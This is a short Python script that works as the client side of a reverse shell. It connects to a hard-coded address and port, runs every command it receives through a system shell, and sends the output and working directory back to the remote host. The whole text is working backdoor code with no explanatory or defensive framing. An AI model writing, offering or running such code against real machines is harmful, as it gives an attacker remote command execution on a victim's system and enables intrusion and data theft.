import os
import socket
import subprocess

s = socket.socket()
host = "192.168.1.74"
port = 9999
s.connect((host, port))

while True:
    encoded_data = s.recv(1024)
    data = encoded_data.decode("utf-8")
    if data[:2] == "cd":
        try:
            os.chdir(data[3:])
        except os.error as msg:
            print("os error: " + str(msg))
    if len(data) > 0:
        cmd = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
        output_bytes = cmd.stdout.read() + cmd.stderr.read()
        output_str = str(output_bytes, "ISO-8859-1")
        s.send(str.encode(output_str + str(os.getcwd()) + "> "))
        print(output_str)

